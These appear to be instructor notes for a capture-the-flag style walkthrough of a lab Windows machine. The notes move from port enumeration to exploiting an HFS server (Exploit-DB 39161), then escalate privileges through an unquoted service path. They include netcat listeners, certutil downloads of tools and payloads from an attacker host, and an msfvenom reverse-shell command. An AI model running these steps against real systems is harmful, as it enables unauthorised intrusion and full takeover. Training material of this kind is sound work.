### Enumeration
- nmap Automator
```
nmapAutomator.sh -t Vulns -o nmap_automator -H 10.10.220.173
```
- Auto Recon
```
autorecon 10.10.220.173
```

- What ports are open?
	- 80, 135,139, 445, 3389, 5985, 8080, random high ports
		- Talk about how 135, 139 and 445 are typically open
	- Visit the page for each port
		- If you get 404, make sure to try HTTPS
		- 8080 has login info
			- Split terminal into 2
	- Search each version for exploit
### Initial Access

- https://www.exploit-db.com/exploits/39161
	- Make sure to change local port number and IP in the script
	- Set NC listener
		- `nc -lnvp 6666`
	- Host the NC file
		- Talk about UPDOG
			- Show how we are running updog
			- `pipx install updog`
			- Move to HTTP folder
			- `updog -p 80`
		- Grab the nc.exe
			- Google where nc.exe is on Kali
			- Copy to `/home/kali/Desktop/training/USCG/training/OSCP/HTTP`
	- Run the exploit
		- `python2 2014-6287.py 10.10.220.173 8080`
		- Check that updog gets hit
		- Run again
	- Get a shell
		- Immediate SA commands
			- whoami /priv
			- ipconfig /all
			- tasklist
	- Get user.txt on desktop
### Priv Esc
- Try and access administrator right away
- Create folder on Bill Desktop
	- `mkdir priv`
- Copy over winpeas and sharpup
	- Talk about how I used them on test
	- `certutil -urlcache -split -f http://10.6.25.100/PowerUp.ps1`
	- `certutil -urlcache -split -f http://10.6.25.100/winPEASany.exe`
- Run PowerUp.ps1
	- Start powershell with `powershell.exe -ep bypass`
	- `. .\PowerUp.ps1``
		- Seems to be broken
	- `C:\Users\bill\Desktop\priv`
- Try Winpeas
	- `.\winPEASany.exe`
	- Lots of info
	- Check out interesting services
```
AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected
```
- Literally gives you the instructions
	- https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
- Make a service EXE named the same in updog
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.25.100 LPORT=5555 -f exe -o Advanced.exe
```
- Copy the file over
	- `certutil -urlcache -split -f http://10.6.25.100/Advanced.exe`
	- move the old Advanced and save it to location
	`copy C:\Users\Bill\desktop\Advanced.exe C:\Program Files (x86)\IObit
	- Setup listener on 5555 
		- `nc -nlvp 5555`
- Stop server
	- `sc stop AdvancedSystemCareService9`
- Start service
	- `sc start AdvancedSystemCareService9`
- Get callback
	- Typically can't stop/start services, then you would restart machine